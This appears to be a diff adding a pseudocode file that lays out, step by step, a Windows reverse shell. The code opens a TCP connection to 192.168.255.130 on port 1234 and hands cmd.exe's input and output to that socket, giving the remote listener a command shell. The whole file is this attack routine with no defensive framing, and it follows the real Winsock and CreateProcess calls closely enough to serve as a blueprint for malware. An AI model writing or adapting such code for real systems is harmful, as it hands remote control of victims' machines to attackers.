@@ -1,0 +1,55 @@
+FUNCTION main()
+    // Step 1: Initialize Winsock
+    result = InitializeWinsock(Version 2.2)
+    IF result fails THEN
+        PRINT "Winsock initialization failed"
+        EXIT with error
+
+    // Step 2: Create a TCP socket
+    shell = CreateSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    IF shell is INVALID_SOCKET THEN
+        PRINT "Socket creation failed"
+        EXIT with error
+
+    // Step 3: Configure the server address
+    shell_address.sin_family = AF_INET
+    shell_address.sin_port = ConvertToNetworkByteOrder(1234)    // Set port to 1234
+    shell_address.sin_addr = ConvertToNetworkAddress("192.168.255.130")  // Set IP address to 192.168.255.130
+
+    // Step 4: Connect to the server using the created socket
+    connection = ConnectToServer(shell, shell_address)
+    IF connection fails THEN
+        PRINT "Connection failed"
+        EXIT with error
+
+    // Step 5: Receive data from the server (e.g., for authentication or commands)
+    receive = ReceiveData(shell, receiveserver, SIZE_OF(receiveserver))
+    IF receive fails THEN
+        PRINT "Data reception failed"
+        EXIT with error
+
+    // Step 6: Set up the STARTUPINFO structure for process creation
+    InitializeStartupInfo(si)
+    SetFlags(si.dwFlags, STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW)
+    RedirectHandles(si, shell)  // Redirect input/output/error to the socket
+
+    // Step 7: Create a new process (cmd.exe) for interaction
+    result = CreateProcess("C:\\Windows\\System32\\cmd.exe", si, pi)
+    IF result fails THEN
+        PRINT "Process creation failed"
+        EXIT with error
+
+    // Step 8: Wait for the created process (cmd.exe) to finish
+    WaitForProcessCompletion(pi.hProcess)
+
+    // Step 9: Clean up resources
+    CloseHandle(pi.hProcess)
+    CloseHandle(pi.hThread)
+    ClearBuffer(receiveserver)
+
+    // Step 10: Close socket and clean up Winsock
+    CloseSocket(shell)
+    CleanupWinsock()
+
+    RETURN 0
+END FUNCTION
